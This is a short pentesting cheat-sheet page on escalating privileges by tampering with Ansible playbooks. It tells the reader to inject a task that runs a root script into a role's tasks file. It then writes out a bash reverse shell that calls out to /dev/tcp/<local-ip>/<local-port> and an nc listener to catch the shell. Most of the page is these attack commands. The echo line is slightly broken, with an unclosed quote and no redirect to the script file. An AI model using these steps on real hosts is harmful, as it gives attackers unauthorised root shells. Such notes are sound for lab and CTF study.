---
title: Ansible Playbook Pentesting
description: Ansible Playbooks are lists of tasks that automatically execute against hosts.
tags:
  - Privilege Escalation
refs:
date: 2022-11-22
draft: false
---

## Privilege Escalation with Task

First off, check the content of playbook in /opt/ansible/playbooks.  
For instance, a file named “httpd.yaml”.

```yaml
- name: Install and configure Apache
  ...
  roles:
    - role: geerlingguy.apache
  tasks:
    - name: configure firewall
      firewalld:
        ...
```

Next, check the content of configure files in /opt/ansible/roles/geerlingguy.apache/tasks. And add the exploitable file in this.  
For example, a file named “configure-RedHat.yml”.

```yaml
...
- name: Reverse Shell
  command: sudo bash /tmp/root.sh
```

Create a exploit for reverse shell.

```sh
echo '/bin/bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1
```

Then open a listener in local machine.

```sh
nc -lvnp <local-port>
```

At the end, execute “ansible”

```sh
ansible
# or 
sudo -u <some-user> ansible
```